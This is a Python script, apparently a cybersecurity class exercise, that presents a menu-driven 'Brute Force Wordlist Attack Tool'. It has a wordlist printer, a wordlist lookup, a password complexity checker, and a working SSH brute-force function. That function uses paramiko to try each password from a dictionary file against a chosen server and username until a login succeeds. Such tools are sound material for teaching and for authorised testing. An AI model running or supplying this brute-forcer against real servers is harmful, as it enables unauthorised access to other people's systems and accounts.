import time
import getpass
import paramiko  # Import the Paramiko library

# Part 1: Dictionary Iterator Function (Mode 1)
def dictionary_iterator():
    filepath = input("Enter your dictionary filepath:\n")
    file = open(filepath, encoding="ISO-8859-1")
    line = file.readline()
    while line:
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(1)
        line = file.readline()
    file.close()

# Part 2: Password Recognized Function (Mode 2)
def password_recognized():
    filepath = input("Enter your dictionary filepath:\n")
    string = getpass.getpass("Enter a string: ")
    file = open(filepath, encoding="ISO-8859-1")
    if string in file.read():
        print(f"The string '{string}' was found in the word list.")
    else:
        print(f"The string '{string}' was not found in the word list.")
    file.close()

# Part 3: Password Complexity Function (Mode 3)
def password_complexity():
    password = getpass.getpass("Enter a password: ")
    metrics = {
        'length': len(password) >= 8,
        'capital_letter': any(c.isupper() for c in password),
        'number': any(c.isdigit() for c in password),
        'symbol': any(not c.isalnum() for c in password),
    }

    for metric, result in metrics.items():
        print(f"{metric}: {'Passed' if result else 'Failed'}")

    if all(metrics.values()):
        print("SUCCESS: The password meets all requirements.")
    else:
        print("FAILURE: The password does not meet all requirements.")

# Part 4: SSH Brute Force Function (Mode 4)
def ssh_brute_force():
    ip = input("Enter the IP address of the SSH server: ")
    username = input("Enter the username: ")
    filepath = input("Enter your dictionary filepath:\n")

    with open(filepath, 'r', errors='ignore') as file:
        for line in file:
            password = line.strip()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip, username=username, password=password)
                print(f"SUCCESS: SSH login successful with password '{password}'")
                break
            except paramiko.AuthenticationException:
                print(f"FAILED: SSH login failed with password '{password}'")
            except paramiko.SSHException as e:
                print(f"Error: {e}")
            finally:
                ssh.close()

# Main Function
if __name__ == "__main__":
    while True:
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - Defensive, Password Complexity
4 - SSH Brute Force
5 - Exit
Please enter a number: 
""")
        if mode == "1":
            dictionary_iterator()
        elif mode == "2":
            password_recognized()
        elif mode == "3":
            password_complexity()
        elif mode == "4":
            ssh_brute_force()
        elif mode == "5":
            break
        else:
            print("Invalid selection...")


# Sources: 
# https://github.com/codefellows/seattle-cybersecurity-401d8/blob/main/class-16/challenges/DEMO.md
# https://openai.com 